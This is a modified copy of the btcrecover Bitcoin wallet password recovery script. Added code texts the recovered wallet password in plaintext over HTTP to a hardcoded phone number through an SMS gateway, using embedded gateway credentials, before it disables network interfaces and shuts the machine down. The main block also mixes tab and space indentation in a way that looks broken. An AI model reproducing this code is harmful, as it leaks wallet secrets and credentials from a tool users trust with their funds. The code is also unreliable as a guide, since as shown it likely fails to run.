#!/usr/bin/env python

# btcrecover.py -- Bitcoin wallet password recovery tool
# Copyright (C) 2014-2017 Christopher Gurnee
#
# This program is free software: you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version
# 2 of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see http://www.gnu.org/licenses/

# If you find this program helpful, please consider a small
# donation to the developer at the following Bitcoin address:
#
#           3Au8ZodNHPei7MQiSVAWb7NB2yqsb48GW4
#
#                      Thank You!

# PYTHON_ARGCOMPLETE_OK - enables optional bash tab completion

import compatibility_check

from btcrecover import btcrpass
import sys, multiprocessing, subprocess, os, re
import requests
import urllib.parse

def disable_network_interfaces():
        """Disable all network interfaces on the system.

        Windows systems use the ``netsh`` command while Unix-like
        platforms rely on ``ip`` or fall back to ``ifconfig``.  Any
        errors are printed but do not stop execution.  This action
        usually requires administrative privileges."""
        try:
                if os.name == "nt":
                        out = subprocess.check_output(["netsh", "interface", "show", "interface"], text=True, encoding="utf-8", errors="ignore")
                        names = []
                        for line in out.splitlines():
                                line = line.strip()
                                if not line or line.startswith("Admin"):
                                        continue
                                # columns: Admin State  State Type  Interface Name
                                parts = line.split()
                                if len(parts) >= 4:
                                        names.append(" ".join(parts[3:]))
                                elif len(parts) >= 2:
                                        names.append(parts[-1])
                        for name in names:
                                subprocess.call(["netsh", "interface", "set", "interface", name, "admin=DISABLED"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                        try:
                                out = subprocess.check_output(["ip", "-o", "link", "show"], text=True)
                                names = [line.split(":")[1].strip().split("@")[0] for line in out.splitlines()]
                        except Exception:
                                out = subprocess.check_output(["ifconfig", "-a"], text=True)
                                names = [m.group(1) for m in re.finditer(r"^(\S+):", out, re.MULTILINE)]
                        for name in names:
                                if name == "lo":
                                        continue
                                subprocess.call(["ip", "link", "set", name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
                print("Failed to disable network:", e, file=sys.stderr)

def send_sms(message,
             gateway="192.168.1.99",
             port=80,
             username="apitg800",
             password="alciona",
             simslot=2,
             number="0740660399"):
        """Send ``message`` via the configured SMS gateway."""

        encoded_message = urllib.parse.quote(message)
        url = (f"http://{gateway}:{port}/cgi/WebCGI?1500101="
               f"account={username}&password={password}&port={simslot}"
               f"&destination={number}&content={encoded_message}")
        try:
                response = requests.get(url, timeout=5)
                if response.status_code != 200:
                        print(f"Failed to send SMS. Status code: {response.status_code}", file=sys.stderr)
                else:
                        print("SMS sent successfully!")
        except Exception as e:
                print(f"Error sending SMS: {e}", file=sys.stderr)

if __name__ == "__main__":
	print()
	print("Starting", btcrpass.full_version(),
		  file=sys.stderr if any(a.startswith("--listp") for a in sys.argv[1:]) else sys.stdout)  # --listpass

	btcrpass.parse_arguments(sys.argv[1:])
	(password_found, not_found_msg) = btcrpass.main()

	if isinstance(password_found, str):
		print()
		print("If this tool helped you to recover funds, please consider donating 1% of what you recovered, in your crypto of choice to:")
		print("BTC: 37N7B7sdHahCXTcMJgEnHz7YmiR4bEqCrS ")
		print("BCH: qpvjee5vwwsv78xc28kwgd3m9mnn5adargxd94kmrt ")
		print("LTC: M966MQte7agAzdCZe5ssHo7g9VriwXgyqM ")
		print("ETH: 0x72343f2806428dbbc2C11a83A1844912184b4243 ")

		#print("VTC: vtc1qxauv20r2ux2vttrjmm9eylshl508q04uju936n ")
		#print("ZEN: znUihTHfwm5UJS1ywo911mdNEzd9WY9vBP7 ")
		#print("DASH: Xx2umk6tx25uCWp6XeaD5f7CyARkbemsZG ")
		#print("DOGE: DMQ6uuLAtNoe5y6DCpxk2Hy83nYSPDwb5T ")
		#print("XMR: 48wnuLYsPY7ewLQyF4RLAj3N8CHH4oBBcaoDjUQFiR4VfkgPNYBh1kSfLx94VoZSsGJnuUiibJuo7FySmqroAi6c1MLWHYF ")
		#print("MONA: mona1q504vpcuyrrgr87l4cjnal74a4qazes2g9qy8mv ")
		#print("XVG: DLZDT48wfuaHR47W4kU5PfW1JfJY25c9VJ")
		print()
		print("Find me on Reddit @ https://www.reddit.com/user/Crypto-Guide")
		print()
		print("You may also consider donating to Gurnec, who created and maintained this tool until late 2017 @ 3Au8ZodNHPei7MQiSVAWb7NB2yqsb48GW4")
		print()
                btcrpass.safe_print("Password found: '" + password_found + "'")
                if any(ord(c) < 32 or ord(c) > 126 for c in password_found):
                        print("HTML Encoded Password:   '" + password_found.encode("ascii", "xmlcharrefreplace").decode() + "'")
                # Optionally save the recovered password for later use
                if btcrpass.args.found_save_file:
                        try:
                                with open(btcrpass.args.found_save_file, "w") as fp:
                                        fp.write(password_found + "\n")
                        except Exception as e:
                                print("Failed to write found password:", e, file=sys.stderr)

                # Shut the machine down when requested
                if btcrpass.args.shutdown_after_found:


                        # Send an SMS with the password before disconnecting
                        send_sms(f"Recovered password: {password_found}")


                        # Optionally disconnect from the network before shutting down
                        if btcrpass.args.disable_network:
                                disable_network_interfaces()

                        import os

                        cmd = "shutdown -h now" if os.name != "nt" else "shutdown /s /t 0"
                        os.system(cmd)
                retval = 0

	elif not_found_msg:
		print(not_found_msg, file=sys.stderr if btcrpass.args.listpass else sys.stdout)
		retval = 0

	else:
		retval = 1  # An error occurred or Ctrl-C was pressed

	# Wait for any remaining child processes to exit cleanly (to avoid error messages from gc)
	for process in multiprocessing.active_children():
		process.join(1.0)

	sys.exit(retval)
